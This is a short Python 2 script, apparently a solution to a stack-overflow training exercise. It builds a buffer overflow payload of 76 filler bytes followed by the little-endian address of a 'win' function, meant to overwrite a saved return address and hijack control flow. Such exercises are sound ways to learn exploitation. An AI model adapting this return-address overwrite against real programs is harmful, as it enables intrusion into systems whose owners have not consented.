#76 in payload ($esp + 10) - ($ebp + 4)
payload = "1234567890123456789012345678901234567890123456789012345678901234567890123456"


#win function address 080483f4
data = "\xf4\x83\x04\x08"

print payload + data


